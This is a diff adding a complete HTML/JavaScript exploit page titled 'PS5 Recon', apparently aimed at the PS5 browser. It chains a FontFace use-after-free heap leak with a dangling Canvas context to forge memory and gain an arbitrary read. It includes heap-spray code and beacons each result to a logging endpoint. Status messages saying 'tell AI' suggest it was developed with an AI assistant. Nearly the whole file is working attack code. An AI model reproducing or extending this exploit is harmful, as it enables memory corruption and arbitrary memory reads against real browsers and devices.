@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-store">
+<title>PS5 Recon</title>
+<style>
+:root{--bg:#0b0e14;--panel:#121722;--line:#1f2838;--txt:#c9d4e3;--dim:#6b7a90;--green:#37d67a;--red:#ff5c5c;--amber:#ffcc66;--cyan:#49c7e0}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{background:var(--bg);color:var(--txt);font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
+body{padding:0}
+#bn{position:fixed;top:0;left:0;right:0;z-index:99;font:700 17px/1.3 ui-monospace,monospace;padding:16px 12px;text-align:center;color:#fff;background:#222;border-bottom:3px solid #333;min-height:22px}
+#sub{position:fixed;top:70px;left:0;right:0;z-index:98;font:600 11px ui-monospace,monospace;padding:6px 12px;text-align:center;color:var(--dim);background:#0f131c;border-bottom:1px solid var(--line)}
+#log{margin:104px 10px 10px;padding:10px;background:var(--panel);border:1px solid var(--line);border-radius:8px;max-height:72vh;overflow:auto}
+.r{padding:2px 4px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
+.r .t{color:var(--cyan);font-weight:700}
+.r.ok{border-left-color:var(--green)}.r.ok .t{color:var(--green)}
+.r.bad{border-left-color:var(--red);background:#1a0f12}.r.bad .t{color:var(--red)}
+.r.warn .t{color:var(--amber)}
+.r.dim{color:var(--dim)}.r.dim .t{color:var(--dim)}
+</style></head>
+<body>
+<div id="bn">starting…</div>
+<div id="sub">Canvas cross-type arbitrary-read oracle — FontFace leak → forge m_stateStack → lineWidth read</div>
+<div id="log"></div>
+<script>
+'use strict';
+window.PTAG='P1305';
+var LOG=document.getElementById('log'),BN=document.getElementById('bn');
+function S(x,c){BN.textContent=x;BN.style.background=c||'#222';}
+function cls(s){var z=(''+s).toLowerCase();if(/arw-ok|done.*works|uaf.?ok|a-hit/.test(z))return 'ok';if(/err|fail|zero|patched|badptr|crash|fatal/.test(z))return 'bad';if(/miss|retry|held/.test(z))return 'warn';return '';}
+function row(t,d,c){var r=document.createElement('div');r.className='r '+(c||'');r.innerHTML="<span class='t'>"+t+"</span>"+(d?" <span>"+String(d).replace(/[<>&]/g,'')+"</span>":"");LOG.appendChild(r);LOG.scrollTop=LOG.scrollHeight;}
+function B(tag,data){
+  var c=cls(tag+' '+(data||''));row(tag,data,c);
+  try{var s=String(data||'').replace(/[^A-Za-z0-9._x-]/g,'_').slice(0,200);
+    new Image().src='/beacon.php?tag=P1305-'+encodeURIComponent(tag)+'&data='+encodeURIComponent(s)+'&t='+Date.now();}catch(e){}
+}
+function hex(v){try{return '0x'+BigInt(v).toString(16);}catch(e){return String(v);}}
+function f64bits(v){var b=new ArrayBuffer(8);new Float64Array(b)[0]=v;return new BigUint64Array(b)[0];}
+
+/* crash-hold: one attempt per fresh browser open (sessionStorage clears on fresh open) */
+var HELD=false; /* no crash-hold: no auto-reload here, so each page load runs exactly once; a fresh open = a fresh attempt with fresh memory */
+
+/* ---- Stage B: Canvas cross-type arbitrary read of mem[p58] ---- */
+function stageB(p58,p68){
+  B('B-GO','read mem['+hex(p58)+'] via Canvas forge');
+  var innerCtx2=null;
+  var canvas2=document.createElement('canvas');canvas2.width=1;canvas2.height=1;
+  var o={};Object.defineProperty(o,'alpha',{get:function(){innerCtx2=canvas2.getContext('2d');return true;}});
+  try{canvas2.getContext('bitmaprenderer',o);}catch(e){B('B-CTX-ERR',e.name);}
+  if(!innerCtx2){ B('B-FAIL','no dangling 2d ctx (Canvas UAF patched?)'); S('Canvas UAF failed - tell AI','#5a2a2a'); B('DONE','b-fail'); return; }
+  B('B-UAF','dangling 2d ctx ok');
+  var NAB=200,abs=[];
+  try{for(var ai=0;ai<NAB;ai++)abs.push(new ArrayBuffer(768));}catch(e){B('B-OOM','spray oom: '+e.name);}
+  var TARGET=p58-48n;
+  for(var fi=0;fi<abs.length;fi++){var bv=new BigUint64Array(abs[fi]);var u32=new Uint32Array(abs[fi]);bv[14]=TARGET;u32[30]=1;u32[31]=1;}
+  B('B-FORGED','spray='+abs.length+' target='+hex(TARGET));
+  var lw=null,err=null;try{lw=innerCtx2.lineWidth;}catch(e){err=(e.message||String(e));}
+  if(err!==null){ B('B-READ-ERR',err.slice(0,120)); S('read threw - tell AI','#5a2a2a'); B('DONE','b-read-err'); return; }
+  var bits=f64bits(lw);
+  var nz=(bits!==0n),heap=(bits>=0x1000000000n&&bits<0x8000000000n),mod=(bits>=0x800000000n&&bits<0x900000000n);
+  B('B-READ','mem['+hex(p58)+'] bits='+hex(bits));
+  if(nz&&(heap||mod)){ B('ARW-OK','ARBITRARY READ WORKS = '+hex(bits)+(mod?' (MODULE ptr!)':' (heap ptr)')); S('ARBITRARY READ WORKS !!! tell AI','#0a7a2a'); }
+  else if(nz){ B('ARW-VAL','nonzero but not ptr-shaped: '+hex(bits)); S('read nonzero (value '+hex(bits)+') - tell AI','#0a4a5a'); }
+  else { B('ARW-ZERO','read 0 - reclaim missed or offset off'); S('read=0 (reclaim miss) - fresh-open retry','#5a3a1a'); }
+  /* 2nd target p68 for cross-check */
+  if(p68&&p68>48n){ try{var T2=p68-48n;for(var g=0;g<abs.length;g++)new BigUint64Array(abs[g])[14]=T2;var lw2=innerCtx2.lineWidth;B('B-2ND','mem['+hex(p68)+'] bits='+hex(f64bits(lw2)));}catch(e){B('B-2ND-ERR',(e.message||'').slice(0,60));} }
+  B('DONE','verdict nz='+nz+' heap='+heap+' mod='+mod);
+}
+
+/* ---- Stage A: FontFace reclaim -> leak p58/p68 (reliable) ---- */
+function leScan(){
+  var sp=window.__sp||[],hitK=-1,p58=0n,p68=0n;
+  function le(u,o){var x=0n;for(var q=7;q>=0;q--)x=(x<<8n)|BigInt(u[o+q]);return x;}
+  for(var i=0;i<sp.length;i++){var a=le(sp[i],0x58);if(a>0x1000000000n){p58=a;p68=le(sp[i],0x68);hitK=i;break;}}
+  if(hitK<0){ B('A-MISS','no reclaim this open - fresh-open to retry'); S('no leak - fresh-open (close+reopen) to retry','#5a3a1a'); B('DONE','a-miss'); return; }
+  B('A-HIT','p58='+hex(p58)+' p68='+hex(p68)+' k='+hitK);
+  if(!(p58>=0x1000000000n&&p58<0x8000000000n)){ B('A-BADPTR',hex(p58)); S('leak odd - fresh-open retry','#5a3a1a'); B('DONE','a-badptr'); return; }
+  S('leak ok - testing Canvas arbitrary read…','#0a4a5a');
+  setTimeout(function(){ try{stageB(p58,p68);}catch(e){B('B-FATAL',(e.message||e.name||'err').slice(0,80));B('DONE','b-fatal');} },60);
+}
+function stageA(){
+  B('START','combined FontFace-leak + Canvas arbitrary-read oracle');
+  var K=32,SIZE=192,fired=false;
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){B('A-NOVF',e.name);B('DONE','a-novf');return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+  window.__sp=[];
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.textContent='';fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}fs=null;
+    try{document.body.offsetHeight;}catch(e){}
+    for(var k=0;k<K;k++){var w=new Uint8Array(new ArrayBuffer(SIZE));w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;window.__sp.push(w);}
+    return undefined;
+  },set:function(){}});
+  try{document.fonts.load('1em vf, v1','AB').then(function(f){B('A-RES','n'+f.length);setTimeout(leScan,80);},function(e){B('A-RJ',String(e&&e.name));setTimeout(leScan,80);});}catch(e){B('A-LOADERR',e.name);}
+  setTimeout(function(){ if(!window.__sp||window.__sp.length===0){B('A-NOSPRAY','then-getter never fired');B('DONE','a-nospray');} },1500);
+}
+
+window.addEventListener('DOMContentLoaded',function(){
+  if(HELD){ S('prior attempt ended - CLOSE + REOPEN browser for a fresh try','#5a3a1a'); B('HELD','one attempt per fresh open; close+reopen to retry (or ?reset=1)'); return; }
+  S('running… (press OK on any memory dialog)','#222');
+  setTimeout(function(){ try{stageA();}catch(e){ B('FATAL',(e.message||e.name||'err').slice(0,100)); } },60);
+});
+</script>
+</body></html>
